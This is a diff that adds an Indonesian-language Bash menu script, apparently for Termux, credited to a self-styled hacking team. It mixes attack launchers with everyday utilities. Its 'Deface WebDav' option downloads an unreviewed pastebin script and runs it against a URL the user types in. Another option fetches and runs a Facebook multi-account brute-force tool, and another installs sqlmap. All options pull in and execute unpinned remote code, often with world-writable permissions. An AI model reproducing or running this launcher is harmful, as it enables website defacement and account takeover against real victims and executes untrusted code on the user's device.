@@ -1,0 +1,119 @@
+#!/bin/bash
+clear
+echo "##########################"
+echo "# Code By Mr 4n0nsr00T   #"
+echo "#                        #"
+echo "# Santri Salafy Cyber    #"
+echo "# Security Darknet       #"
+echo "# One Squad Team         #"
+echo "##########################"
+echo "# 01 Deface WebDav       #"
+echo "# 02 Exit                #"
+echo "# 03 Bikin SC            #"
+echo "# 04 Hack FB (mbf)       #"
+echo "# 05 SQLMAP              #"
+echo "# 06 Instabot            #"
+echo "# 07 Jadwal Sholat       #"
+echo "# 08 ServerPHP           #"
+echo "##########################"
+
+read -p "Pilih~Nomor=#: " n;
+
+if [ $n = 01 ] || [ $n = 1 ];then
+clear
+mkdir webdav
+mv webdav $HOME
+cd webdav
+pkg install curl
+pkg install python2
+pkg install openssl curl
+pkg install libcurl
+pip2 install urllib3 chardet certifi idna requests
+curl -LO https://pastebin.com/raw/HnVyQPtR
+mv HnVyQPtR webdav.py
+chmod 777 webdav.py
+read -p "Nama_SC~#: " sc;
+read -p "Nama_Url~#: " url;
+python2 webdav.py $sc $url
+echo "Coba Cek Situsnya Kalau Gagal jgn 
+menyerah! , Coba Lagi Sampai Bisa asalkan 
+ada Niatnya"
+fi
+
+if [ $n = 02 ] || [ $n = 2 ];then
+clear
+echo "Terima Kasih Telah Menggunakan Tools 
+Saya :)"
+
+clear
+
+echo "Wassalammualaikum warahmatullahi 
+wabarakatuh"
+
+fi
+
+if [ $n = 03 ] || [ $n = 3 ];then
+clear
+pkg install curl
+curl -LO https://raw.githubusercontent.com/4L13199/LITESCRIPT/master/LITESCRIPT.py
+pkg install python2
+clear
+python2 LITESCRIPT.py
+fi
+
+
+if [ $n = 04 ] || [ $n = 4 ];then
+clear
+pkg install curl
+pkg install python2
+curl -LO https://raw.githubusercontent.com/tikuskecil/multi-bruteforce-facebook/master/MBF.py
+clear
+pip2 install mechanize
+python2 MBF.py
+fi
+
+if [ $n = 05 ] || [ $n = 5 ];then
+pkg install git
+pkg install python2
+pkg install python
+git clone https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+clear
+python2 sqlmap.py
+fi
+
+if [ $n = 06 ] || [ $n = 6 ];then
+echo "Install Bahannya Dulu!"
+pkg install figlet
+pkg install python2
+pkg install ruby
+pkg install toilet
+gem install lolcat
+pkg install nano
+pkg install python
+git clone https://github.com/Senitopeng/instabot.git
+cd instabot
+pip2 install instabot
+pip2 install -r requirements.txt
+chmod 777 *
+clear
+./instabot
+fi
+
+if [ $n = 07 ] || [ $n = 7 ];then
+pkg install grep
+pkg install curl
+git clone https://github.com/aryanrtm/Jadwal-Sholat
+cd Jadwal-Sholat
+chmod 777 *
+./jadwal-sholat.sh
+fi
+
+if [ $n = 08 ] || [ $n = 8 ];then
+clear
+pkg install php
+git clone https://github.com/mr4n0nsr00t/ServerPHP
+cd ServerPHP
+chmod 777 *
+./serverphp
+fi
